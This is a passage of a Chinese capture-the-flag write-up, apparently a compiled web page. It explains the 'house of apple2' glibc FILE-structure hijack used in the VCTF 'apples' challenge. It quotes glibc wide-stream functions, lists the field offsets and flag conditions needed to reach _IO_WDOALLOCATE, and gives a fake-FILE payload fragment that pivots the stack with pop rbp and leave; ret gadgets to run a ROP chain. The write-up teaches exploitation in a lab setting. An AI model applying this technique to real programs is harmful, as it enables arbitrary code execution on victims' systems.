    <span class="token keyword">return</span> <span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">==</span> f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_end<span class="token punctuation">)</span>
    <span class="token comment">/* Buffer is really full */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> WEOF<span class="token punctuation">;</span>
  <span class="token operator">*</span>f<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_write_ptr<span class="token operator">++</span> <span class="token operator">=</span> wch<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_UNBUFFERED<span class="token punctuation">)</span>
      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_LINE_BUF<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> wch <span class="token operator">==</span> L<span class="token char">&#39;\\n&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> WEOF<span class="token punctuation">;</span>
  <span class="token keyword">return</span> wch<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>所以我们需要满足条件:</p><ul><li><p>f-&gt;_flags &amp; _IO_NO_WRITES为0</p></li><li><p>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0</p><ul><li>也就是_flags位置为0</li></ul></li><li><p>f-&gt;_wide_data(0xa0)-&gt;_IO_write_base(0x20) == 0</p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_W2X8G9QZJ7BGDFG.jpg" alt="image-20240515224054184" tabindex="0" loading="lazy"><figcaption>image-20240515224054184</figcaption></figure></li></ul><h3 id="io-wdoallocbuf函数" tabindex="-1"><a class="header-anchor" href="#io-wdoallocbuf函数" aria-hidden="true">#</a> <code>_IO_wdoallocbuf</code>函数</h3><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token keyword">void</span>  <span class="token function">_IO_wdoallocbuf</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>fp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token comment">// _wide_data -&gt; _IO_buf_base 不能为1</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_IO_buf_base<span class="token punctuation">)</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token comment">// fp-&gt;_flags 二位得为0</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_flags <span class="token operator">&amp;</span> _IO_UNBUFFERED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment">// 利用这里的函数调用</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">wint_t</span><span class="token punctuation">)</span><span class="token function">_IO_WDOALLOCATE</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">!=</span> WEOF<span class="token punctuation">)</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">_IO_wsetb</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_shortbuf<span class="token punctuation">,</span>fp<span class="token operator">-&gt;</span>_wide_data<span class="token operator">-&gt;</span>_shortbuf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>这里我们要执行<code>_IO_WDOALLOCATE</code>从而调用我们伪造的函数 所以我们这里需要过掉保护<code>fp-&gt;_wide_data-&gt;_IO_buf_base</code>和<code>!(fp-&gt;_flags &amp; _IO_UNBUFFERED)</code></p><ul><li><p>也就是<code>_wide_data</code>(0xa0)的<code>_IO_buf_base</code>(0x38)偏移位置要为0</p><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_64WHSSP4STC9U9S.jpg" alt="image-20240515215042717" tabindex="0" loading="lazy"><figcaption>image-20240515215042717</figcaption></figure></li></ul></li></ul><h3 id="触发-io-wdoallocate-fp" tabindex="-1"><a class="header-anchor" href="#触发-io-wdoallocate-fp" aria-hidden="true">#</a> 触发<code>_IO_WDOALLOCATE(fp)</code></h3><blockquote><p>这里等效为: *(fp-&gt;_wide_data(0xa0)-&gt;_wide_vtable(0xe0) + 0x68)(fp)</p></blockquote><figure><img src="https://bbs.kanxue.com/upload/attach/202405/994584_VDV3RDRQ3PSW4M4.jpg" alt="image-20240515215803234" tabindex="0" loading="lazy"><figcaption>image-20240515215803234</figcaption></figure><ul><li>所以最终就成功调用leave retn指令</li></ul><h3 id="栈迁移" tabindex="-1"><a class="header-anchor" href="#栈迁移" aria-hidden="true">#</a> 栈迁移</h3><ul><li><p>我们先看汇编代码</p><ul><li><img src="https://bbs.kanxue.com/upload/attach/202405/994584_YFDZBWXYKAUV6Y5.jpg" alt="image-20240515220153354" tabindex="0" loading="lazy"><figcaption>image-20240515220153354</figcaption></li></ul></li><li><p>可以看见这里把<code>rdi</code>赋值给了<code>rbx</code> 而根据前面代码可以知道rdi是<code>_io_wdoallocbuf</code>的参数 也就是fp也就是<code>_IO_2_1_stdout_</code></p></li><li><p>那么回顾我们前面的payload</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code>FILE<span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token number">0</span>
FILE<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> pop_rbp
FILE<span class="token punctuation">.</span>_IO_read_end <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x470</span> <span class="token operator">-</span> <span class="token number">8</span>
FILE<span class="token punctuation">.</span>_IO_read_base <span class="token operator">=</span> leave_ret
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><img src="https://bbs.kanxue.com/upload/attach/202405/994584_WTFNFNXJQ26XAEZ.jpg" alt="image-20240515221327579" tabindex="0" loading="lazy"><figcaption>image-20240515221327579</figcaption></li></ul></li><li><p>然后我们<code>pop_rbp</code>让<code>rbp</code>变成我们存放payload的chunk内容然后再通过leave ret让rsp也移动到我们的chunk上 实现栈迁移 然后我们就可以愉快打rop链了</p></li></ul>`,34);function b(f,g){const a=t("ExternalLinkIcon");return o(),c("div",null,[u,r,n("blockquote",null,[n("p",null,[s("本文参考的是"),n("a",d,[s("Arahat0"),e(a)]),s(" 师傅的脚本 这里主要介绍一下vctf apple的house of apple部分的思路 与常规的house of apple不同这里将"),k,s("指向劫持的"),_,s("结构体加减偏移 来让脚本更加可以移植 最后实现栈迁移打ROP链的操作")])]),n("p",null,[s("前情提要:要结合上一篇文章:["),n("a",v,[s("原创]vctf apples leak libc操作复现(高版本libc overlapping)-Pwn-看雪-安全社区|安全招聘|kanxue.com"),e(a)]),s("来观看 在上一篇文章中我们通过较为复杂的overlapping实现了heap和libc的泄露 接下来我们通过劫持结构体来实现一次House of apple2的变形")]),m])}const w=p(i,[["render",b],["__file","house_of_apple2.html.vue"]]);export{w as default};
